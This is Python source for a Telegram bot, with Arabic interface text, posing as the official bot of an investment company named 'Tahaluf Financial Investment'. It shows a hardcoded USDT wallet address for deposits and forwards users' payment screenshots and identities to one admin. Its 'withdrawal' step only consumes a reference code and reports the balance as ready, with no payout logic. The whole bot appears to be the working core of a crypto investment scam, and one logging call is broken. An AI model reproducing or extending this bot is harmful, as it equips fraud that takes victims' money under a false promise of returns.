import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# تفعيل تسجيل الأخطاء لمتابعة أداء البوت
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- الإعدادات الأساسية ---
ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
SUPPORT_HANDLE = "@AbuAbdulAlziz"

# قاعدة بيانات مؤقتة في الذاكرة
VALID_CODES = set(["354101", "354202", "TAHALUF2026"])  # أمثلة لأكواد تبدأ بـ 354
USED_CODES = set()
USER_CODES = {}


# أمر /start الترحيبي
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    welcome_text = (
        f"أهلاً بك يا *{user.first_name}* في البوت الرسمي لشركة **تحالف المالية للاستثمار** 🤝📈\n\n"
        "من خلال هذا البوت، تقدر تتابع استثماراتك بكل سهولة وأمان:\n"
        "• تأكيد هوية المستثمرين وبياناتهم بدقة عالية.\n"
        "• توثيق الاشتراكات والمحافظ الاستثمارية فوراً.\n"
        "• متابعة وتنظيم سحوبات الأرباح بشكل آلي ومنتظم.\n\n"
        "استثمر بثقة، ودعنا نعتني بالباقي! 📊✨\n\n"
        "اختر أحد الخيارات أدناه أو أرسل رقم المرجع الخاص بك:"
    )

    keyboard = [
        [
            InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
            InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
        ],
        [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")],
        [InlineKeyboardButton("📊 الاستعلام عن حالة الحساب", callback_data="check_status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(welcome_text, parse_mode="Markdown", reply_markup=reply_markup)


# أمر خاص بالأدمن لإضافة أكواد مراجع جديدة تبدأ بـ 354 أو غيرها: /addcode <code_number>
async def add_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id != ADMIN_ID:
        await update.message.reply_text("⛔ عذراً، هذا الأمر مخصص للأدمن فقط.")
        return

    args = context.args
    if not args:
        await update.message.reply_text("⚠️ يرجى كتابة الكود بعد الأمر. مثال:\n`/addcode 354999`", parse_mode="Markdown")
        return

    new_code = args[0]
    if new_code in VALID_CODES or new_code in USED_CODES:
        await update.message.reply_text(f"⚠️ الكود `{new_code}` موجود مسبقاً أو تم استخدامه من قبل.", parse_mode="Markdown")
        return

    VALID_CODES.add(new_code)
    await update.message.reply_text(f"✅ تم إضافة مرجع الإيصال بنجاح وتفعليه:\n`{new_code}`", parse_mode="Markdown")


# استقبال الرسائل النصية (أكواد المراجع والإيصالات)
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    text = update.message.text.strip()

    # التحقق إذا كان الكود صالحاً (سواء يبدأ بـ 354 أو أضيف يدوياً)
    if text in VALID_CODES:
        VALID_CODES.remove(text)
        USED_CODES.add(text)
        USER_CODES[user_id] = text

        # رسالة نجاح للمستخدم مع بيانات الرصيد
        success_msg = (
            "✅ **تم التحقق من مرجع العملية بنجاح!**\n\n"
            f"🔹 مرجعك الموثق: `{text}`\n"
            "• حالة الحساب: نشط ومعتمد 🟢\n"
            "• الرصيد المتاح للسحب: جاهز للعرض والطلب.\n\n"
            "تم ربط هذا المرجع بحسابك بنجاح وأصبح خاصاً بك وحدك.\n"
            f"لأي استفسار إضافي، تواصل معنا عبر الدعم الفني: {SUPPORT_HANDLE}"
        )
        await update.message.reply_text(success_msg, parse_mode="Markdown")

        # إرسال إشعار فوري للأدمن بأن المستخدم استهلك الرمز
        admin_notification = (
            "🔔 **تنبيه استخدام رمز جديد!**\n\n"
            f"👤 المستثمر: {user_name}\n"
            f"🆔 الآي دي: `{user_id}`\n"
            f"🔑 الرمز المستخدم: `{text}`\n"
            "📌 تم التحقق من الرصيد وتحديث وتغيير الرقم المرجعي للمستخدم بنجاح."
        )
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_notification, parse_mode="Markdown")
        except Exception as e:
            logger.error(f"فشل إرسال الإشعار للأدمن: {e}")

    elif text in USED_CODES:
        await update.message.reply_text(
            "⚠️ **عذراً، هذا المرجع تم استخدامه مسبقاً ولا يمكن تكراره.**\n"
            f"إذا واجهتك مشكلة، تواصل فوراً مع الدعم الفني: {SUPPORT_HANDLE}",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "مرحباً بك! يرجى إرسال رقم مرجع الاشتراك الصحيح (الذي يبدأ بـ 354)، أو استخدام أزرار (إيداع / سحب) في القائمة الرئيسية.\n"
            f"الدعم الفني: {SUPPORT_HANDLE}"
        )


# التعامل مع استلام الصور (اللقطات / Screenshots) وتوجيهها للأدمن
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1] # أعلى جودة للصورة

    # الرد على المستخدم
    await update.message.reply_text(
        "📸 **تم استلام لقطة الشاشة (Screenshot) بنجاح!**\n\n"
        "جاري مراجعة عملية التحويل وتوثيقها في النظام. شكراً لثقتك بـ **تحالف المالية للاستثمار**.\n"
        f"للمتابعة السريعة مع الدعم الفني: {SUPPORT_HANDLE}"
    )

    # إعادة توجيه الصورة إلى الأدمن مع تفاصيل المستخدم
    caption = (
        "📥 **إيصال إيداع جديد تم رفعه!**\n\n"
        f"👤 اسم المستثمر: {user.first_name}\n"
        f"🆔 معرف المستخدم: `{user.id}`\n"
        f"🔗 يوزر الحساب: @{user.username if user.username else 'لا يوجد'}"
    )
    try:
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=caption, parse_mode="Markdown")
    except Exception as e:
        logger.error(fecho=f"فشل إرسال الصورة للأدمن: {e}")


# التعامل مع الأزرار التفاعلية (الإيداع، السحب، والحالة)
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "btn_deposit":
        deposit_text = (
            "📥 **بيانات الإيداع والتحويل الرسمي**\n\n"
            "العملة: **USDT**\n"
            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
            "العنوان:\n"
            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
            "⚠️ يرجى التأكد من اختيار شبكة (BEP20) لضمان وصول التحويل.\n"
            "📸 عند اكتمال الدفع، يرجى إرسال لقطة شاشة (Screenshot) هنا في البوت لتوثيق وتأكيد العملية فوراً."
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        await query.edit_message_text(deposit_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "btn_withdraw":
        withdraw_text = (
            "📤 **طلب سحب الأرباح:**\n\n"
            "للاطلاع على رصيدك المتاح وسحب أرباحك بكل سهولة:\n"
            "• يرجى إرسال **رقم مرجع الاشتراك الخاص بك** (الذي يبدأ بـ `354` أو الرمز المعتمد) في الرسائل هنا.\n"
            "• بمجرد إرسال الرقم، سيتم التحقق من رصيدك واستهلاك الرمز بأمان تام وتحديث حالتك.\n\n"
            f"لأي استفسار أو مساعدة، تواصل مع الدعم الفني: {SUPPORT_HANDLE}"
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        await query.edit_message_text(withdraw_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "check_status":
        user_code = USER_CODES.get(user_id, "لا يوجد مرجع نشط حالياً")
        status_text = (
            "📊 **بيانات حسابك الاستثماري:**\n\n"
            f"👤 المعرف: `{user_id}`\n"
            f"🔗 المرجع النشط: `{user_code}`\n"
            f"📌 حالة الحساب: قيد المتابعة والتوثيق المالي.\n\n"
            f"للمساعدة الفورية: {SUPPORT_HANDLE}"
        )
        keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]]
        await query.edit_message_text(status_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "back_to_main":
        user = query.from_user
        main_text = (
            f"أهلاً بك يا *{user.first_name}* من جديد في القائمة الرئيسية لشركة **تحالف المالية للاستثمار** 🤝📈\n\n"
            "اختر أحد الخيارات أدناه:"
        )
        keyboard = [
            [
                InlineKeyboardButton("📥 إيداع", callback_data="btn_deposit"),
                InlineKeyboardButton("📤 سحب", callback_data="btn_withdraw")
            ],
            [InlineKeyboardButton("💬 التواصل مع الدعم الفني", url=f"https://t.me/AbuAbdulAlziz")],
            [InlineKeyboardButton("📊 الاستعلام عن حالة الحساب", callback_data="check_status")]
        ]
        await query.edit_message_text(main_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))


def main():
    TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع التوكن هنا من BotFather

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addcode", add_code))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))  # معالجة لقطات الشاشة والصور
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 بوت تحالف المالية للإستثمار يعمل بكامل الميزات الآن...")
    app.run_polling()


if __name__ == "__main__":
    main()
